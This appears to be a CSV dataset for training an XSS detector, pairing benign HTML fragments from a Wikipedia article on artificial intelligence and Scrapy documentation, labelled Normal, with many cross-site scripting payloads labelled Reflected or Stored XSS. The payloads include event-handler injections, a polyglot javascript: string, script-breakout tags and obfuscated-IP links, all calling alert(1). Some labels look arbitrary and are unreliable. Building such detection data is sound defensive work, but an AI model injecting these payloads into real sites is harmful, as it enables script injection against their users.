Sentence,Final_Label
"<li id=""cite_note-ivak1971-253""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ivak1971_253-0"">^ </a> </b> ",Normal
"<area draggable=""true"" ondragstart=""alert(1)"">test</area>",Reflected XSS
<colgroup onpointerover=alert(1)>XSS</colgroup>,Reflected XSS
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/developer-tools.html"">Using your browser’s Developer Tools for scraping</a></li>",Normal
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationstart=""alert(1)""></s>",Reflected XSS
"<li><a href=""/wiki/Roger_Bacon"" title=""Roger Bacon"">Roger Bacon </a> </li>",Normal
"<style>@keyframes slidein {}</style><mark style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></mark>",Reflected XSS
<svg><hr onload=alert(1)></hr>,Stored XSS
"<caption onbeforecopy=""alert(1)"" contenteditable>test</caption>",Reflected XSS
  </script>,Normal
"<center draggable=""true"" ondragenter=""alert(1)"">test</center>",Reflected XSS
"<menuitem onmouseover=""alert(1)"">test</menuitem>",Reflected XSS
"<option onclick=""alert(1)"">test</option>",Reflected XSS
    </div>,Normal
"<li><cite id=""CITEREFMcCarthyHayes1969"" class=""citation journal""><a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">McCarthy, John </a>; Hayes, P. J. (1969). <a rel=""nofollow"" class=""external text"" href=""http://www-formal.stanford.edu/jmc/mcchay69.html"">""Some philosophical problems from the standpoint of artificial intelligence"" </a>. <i>Machine Intelligence </i>. <b>4 </b>: 463–502. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.85.5082"">10.1.1.85.5082 </a> ",Normal
"<dt><a class=""reference internal"" href=""topics/architecture.html""><span class=""doc"">Architecture overview",Normal
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/signals.html"">Signals</a></li>",Normal
<code onpointerleave=alert(1)>XSS</code>,Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></param>",Reflected XSS
"<head onmouseup=""alert(1)"">test</head>",Reflected XSS
<td onpointerleave=alert(1)>XSS</td>,Reflected XSS
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;79–164, 193–219 </li>",Normal
"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",Stored XSS
          <dd>,Normal
"<li><a href=""/wiki/Electronic_publishing"" title=""Electronic publishing"">Electronic publishing </a> </li>",Normal
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></script>",Stored XSS
"	 </span>. Harvard University Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-674-57616-2"" title=""Special:BookSources/978-0-674-57616-2""><bdi>978-0-674-57616-2 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Mind+Children&amp;rft.pub=Harvard+University+Press&amp;rft.date=1988&amp;rft.isbn=978-0-674-57616-2&amp;rft.aulast=Moravec&amp;rft.aufirst=Hans&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fmindchildrenfutu00mora&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<time onbeforecut=""alert(1)"" contenteditable>test</time>",Reflected XSS
"<caption onbeforecut=""alert(1)"" contenteditable>test</caption>",Reflected XSS
"<section onmouseenter=""alert(1)"">test</section>",Reflected XSS
<basefont onpointerout=alert(1)>XSS</basefont>,Reflected XSS
"<li><a href=""/wiki/Psychoanalysis"" title=""Psychoanalysis"">Psychoanalysis </a> </li>",Normal
<svg><center onload=alert(1)></center>,Stored XSS
"<li id=""cite_note-Formal_methods_in_AI-43""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Formal_methods_in_AI_43-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Formal_methods_in_AI_43-1""><sup><i><b>b </b> </i> </sup> </a> ",Normal
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/spider-middleware.html"">Spider Middleware</a></li>",Normal
"<li><a href=""/wiki/Jason_Jixuan_Hu"" title=""Jason Jixuan Hu"">Jason Jixuan Hu </a> </li>",Normal
<dd onblur=alert(1) tabindex=1 id=x></dd><input autofocus>,Reflected XSS
"<ul><li><a href=""#CITEREFHaugeland1985"">Haugeland 1985 </a>, pp.&#160;6–9 </li>",Normal
"<li id=""cite_note-306""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-306"">^ </a> </b> ",Normal
"<style>:target {transform: rotate(180deg);}</style><var id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></var>",Reflected XSS
"<ul><li><a href=""/wiki/Cryptography"" title=""Cryptography"">Cryptography </a> </li>",Normal
<i onpointermove=alert(1)>XSS</i>,Reflected XSS
"<video autoplay onplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",Reflected XSS
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/extensions.html"">Extensions</a></li>",Normal
"<colgroup onkeypress=""alert(1)"" contenteditable>test</colgroup>",Reflected XSS
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;458–467 </li> </ul>",Normal
"<li><img alt=""Commons page"" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/4a/Commons-logo.svg/12px-Commons-logo.svg.png"" decoding=""async"" title=""Commons page"" width=""12"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/4a/Commons-logo.svg/18px-Commons-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/4a/Commons-logo.svg/24px-Commons-logo.svg.png 2x"" data-file-width=""1024"" data-file-height=""1376"" /> <b><a href=""https://commons.wikimedia.org/wiki/Category:Computer_science"" class=""extiw"" title=""commons:Category:Computer science"">Commons </a> </b> </li> </ul>",Normal
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",Reflected XSS
"<li><a href=""/wiki/Military_robot"" title=""Military robot"">Military </a> </li>",Normal
"<li id=""cite_note-6""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-6"">^ </a> </b> ",Normal
"<picture onkeydown=""alert(1)"" contenteditable>test</picture>",Reflected XSS
"	 </span></a></dt><dd>Learn how to configure Scrapy and see all <a class=""hoverxref reference internal"" data-doc=""topics/settings"" data-project=""scrapy"" data-section=""topics-settings-ref"" data-version=""latest"" href=""topics/settings.html#topics-settings-ref""><span class=""std std-ref"">available settings",Normal
<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>,Reflected XSS
"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>",Stored XSS
<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>,Reflected XSS
"<A HREF=""http://66.102.7.147/""></A>",Stored XSS
"<sup oncopy=""alert(1)"" contenteditable>test</sup>",Reflected XSS
"<style>@keyframes x{}</style><table style=""animation-name:x"" onanimationstart=""alert(1)""></table>",Reflected XSS
"<div class=""div-col columns column-width"" style=""-moz-column-width: 20em; -webkit-column-width: 20em; column-width: 20em;"">",Normal
<svg><samp onload=alert(1)></samp>,Stored XSS
"<menu oncontextmenu=""alert(1)"">test</menu>",Reflected XSS
<hgroup onpointerleave=alert(1)>XSS</hgroup>,Reflected XSS
"<li><cite class=""citation book""><a href=""/w/index.php?title=Elaine_Rich&amp;action=edit&amp;redlink=1"" class=""new"" title=""Elaine Rich (page does not exist)"">Rich, Elaine </a> (1983). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/ine0000unse""><i>Artificial Intelligence </i> </a> ",Normal
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",Reflected XSS
<strong id=x tabindex=1 onbeforeactivate=alert(1)></strong>,Reflected XSS
"<script onpaste=""alert(1)"" contenteditable>test</script>",Stored XSS
<svg><source onload=alert(1)></source>,Stored XSS
"<li id=""cite_note-FOOTNOTEDomingos2015chapter_6-212""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015chapter_6_212-0"">^ </a> </b> ",Normal
"<style>:target {transform: rotate(180deg);}</style><keygen id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></keygen>",Reflected XSS
<embed id=x tabindex=1 onactivate=alert(1)></embed>,Stored XSS
"<div class=""thumb tright"">",Normal
"<style>:target {color:red;}</style><ins id=x style=""transition:color 1s"" ontransitionend=alert(1)></ins>",Reflected XSS
<svg><blink onload=alert(1)></blink>,Stored XSS
<iframe onpointermove=alert(1)>XSS</iframe>,Stored XSS
"<center onmouseenter=""alert(1)"">test</center>",Reflected XSS
"<ul><li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, <a rel=""nofollow"" class=""external text"" href=""http://people.cs.ubc.ca/~poole/ci/ch1.pdf"">p. 1 </a>, which provides the version that is used in this article. Note that they use the term ""computational intelligence"" as a synonym for artificial intelligence. </li>",Normal
"<li><a href=""/wiki/SONOS"" title=""SONOS"">SONOS </a> </li> </ul> </li>",Normal
<u onpointerup=alert(1)>XSS</u>,Reflected XSS
"<tbody onmouseleave=""alert(1)"">test</tbody>",Reflected XSS
"<li class=""toclevel-1 tocsection-26""><a href=""#Tools""><span class=""tocnumber"">6 ",Normal
"<li><a href=""/wiki/Elon_Musk"" title=""Elon Musk"">Elon Musk </a> </li>",Normal
"<isindex onmouseenter=""alert(1)"">test</isindex>",Reflected XSS
<script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>,Stored XSS
"<li><a href=""/wiki/Logic"" title=""Logic"">Logic </a> </li>",Normal
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",Reflected XSS
<kbd onpointerout=alert(1)>XSS</kbd>,Reflected XSS
"<li><a href=""/wiki/Holographic_data_storage"" title=""Holographic data storage"">Holographic data storage </a> </li> </ul> </li>",Normal
"<A HREF=""http://0102.0146.0007.00000223/""></A>",Stored XSS
"<plaintext onbeforepaste=""alert(1)"" contenteditable>test</plaintext>",Reflected XSS
"<frameset onmousemove=""alert(1)"">test</frameset>",Reflected XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Harvard+Business+Review&amp;rft.atitle=10+Promising+AI+Applications+in+Health+Care&amp;rft.date=2018-05-10&amp;rft_id=https%3A%2F%2Fhbr.org%2F2018%2F05%2F10-promising-ai-applications-in-health-care&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<svg><command onload=alert(1)></command>,Stored XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=52"" title=""Edit section: Devaluation of humanity"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<li><a href=""/wiki/Multi-agent_system"" title=""Multi-agent system"">Multi-agent system </a> </li>",Normal
</script><script>alert('');</script>,Stored XSS
</dl>,Normal
"<li><cite id=""CITEREFLeggHutter2007"" class=""citation techreport"">Legg, Shane; Hutter, Marcus (15 June 2007). <i>A Collection of Definitions of Intelligence </i> (Technical report). <a href=""/wiki/IDSIA"" class=""mw-redirect"" title=""IDSIA"">IDSIA </a>. <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/0706.3639"">0706.3639 </a> ",Normal
"	 </span> <span class=""reference-text"">Anderson, Susan Leigh. ""Asimov's ""three laws of robotics"" and machine metaethics."" AI &amp; Society 22.4 (2008): 477–493. ",Normal
"<p>Interest in <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">neural networks </a> and ""<a href=""/wiki/Connectionism"" title=""Connectionism"">connectionism </a>"" was revived by <a href=""/wiki/David_Rumelhart"" title=""David Rumelhart"">David Rumelhart </a> and others in the middle of the 1980s.<sup id=""cite_ref-Revival_of_connectionism_172-0"" class=""reference""><a href=""#cite_note-Revival_of_connectionism-172"">&#91;169&#93; </a> </sup> <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">Artificial neural networks </a> are an example of <a href=""/w/index.php?title=Soft_computing&amp;action=edit&amp;redlink=1"" class=""new"" title=""Soft computing (page does not exist)"">soft computing </a>—they are solutions to problems which cannot be solved with complete logical certainty, and where an approximate solution is often sufficient. Other <a href=""/w/index.php?title=Soft_computing&amp;action=edit&amp;redlink=1"" class=""new"" title=""Soft computing (page does not exist)"">soft computing </a> approaches to AI include <a href=""/wiki/Fuzzy_system"" class=""mw-redirect"" title=""Fuzzy system"">fuzzy systems </a>, <a href=""/wiki/Grey_system_theory"" class=""mw-redirect"" title=""Grey system theory"">Grey system theory </a>, <a href=""/wiki/Evolutionary_computation"" title=""Evolutionary computation"">evolutionary computation </a> and many statistical tools. The application of soft computing to AI is studied collectively by the emerging discipline of <a href=""/wiki/Computational_intelligence"" title=""Computational intelligence"">computational intelligence </a>.<sup id=""cite_ref-Computational_intelligence_173-0"" class=""reference""><a href=""#cite_note-Computational_intelligence-173"">&#91;170&#93; </a> </sup>",Normal
<svg><strong onload=alert(1)></strong>,Stored XSS
"<strong draggable=""true"" ondragend=""alert(1)"">test</strong>",Reflected XSS
<iframe onpointerout=alert(1)>XSS</iframe>,Stored XSS
"<ul><li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;509–530, </li>",Normal
<iframe onpointerover=alert(1)>XSS</iframe>,Stored XSS
<embed onpointerout=alert(1)>XSS</embed>,Stored XSS
"<div id=""mw-navigation"">",Normal
"<iframe onbeforecut=""alert(1)"" contenteditable>test</iframe>",Stored XSS
"<li><a href=""/wiki/Electronic_design_automation"" title=""Electronic design automation"">Electronic design automation </a> </li>",Normal
"	 </span> <span class=""reference-text""><a href=""#CITEREFDomingos2015"">Domingos 2015 </a>, Chapter 6, Chapter 7. ",Normal
"<div draggable=""true"" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>",Reflected XSS
" </p><p>The field was founded on the assumption that <a href=""/wiki/Human_intelligence"" title=""Human intelligence"">human intelligence </a> ""can be so precisely described that a machine can be made to simulate it"".<sup id=""cite_ref-20"" class=""reference""><a href=""#cite_note-20"">&#91;20&#93; </a> </sup> This raises philosophical arguments about the nature of the <a href=""/wiki/Mind"" title=""Mind"">mind </a> and the ethics of creating artificial beings endowed with human-like intelligence. These issues have been explored by <a href=""/wiki/History_of_AI#AI_in_myth,_fiction_and_speculation"" class=""mw-redirect"" title=""History of AI"">myth </a>, <a href=""/wiki/Artificial_intelligence_in_fiction"" title=""Artificial intelligence in fiction"">fiction </a> and <a href=""/wiki/Philosophy_of_AI"" class=""mw-redirect"" title=""Philosophy of AI"">philosophy </a> since <a href=""/wiki/Ancient_history"" title=""Ancient history"">antiquity </a>.<sup id=""cite_ref-McCorduck&#39;s_thesis_21-0"" class=""reference""><a href=""#cite_note-McCorduck&#39;s_thesis-21"">&#91;21&#93; </a> </sup> Some people also consider AI to be <a href=""/wiki/Existential_risk"" class=""mw-redirect"" title=""Existential risk"">a danger to humanity </a> if it progresses unabated.<sup id=""cite_ref-22"" class=""reference""><a href=""#cite_note-22"">&#91;22&#93; </a> </sup><sup id=""cite_ref-pmid31835078_23-0"" class=""reference""><a href=""#cite_note-pmid31835078-23"">&#91;23&#93; </a> </sup> Others believe that AI, unlike previous technological revolutions, will create a <a href=""/wiki/Technological_unemployment#21st_century"" title=""Technological unemployment"">risk of mass unemployment </a>.<sup id=""cite_ref-guardian_jobs_debate_24-0"" class=""reference""><a href=""#cite_note-guardian_jobs_debate-24"">&#91;24&#93; </a> </sup>",Normal
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.statefestival.org/program/2017/unhuman-art-in-the-age-of-ai"">""Unhuman: Art in the Age of AI – State Festival"" </a>. Statefestival.org<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 September ",Normal
<nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr>,Reflected XSS
"<style>@keyframes slidein {}</style><iframe style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></iframe>",Stored XSS
<svg><tr onload=alert(1)></tr>,Stored XSS
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT> ",Stored XSS
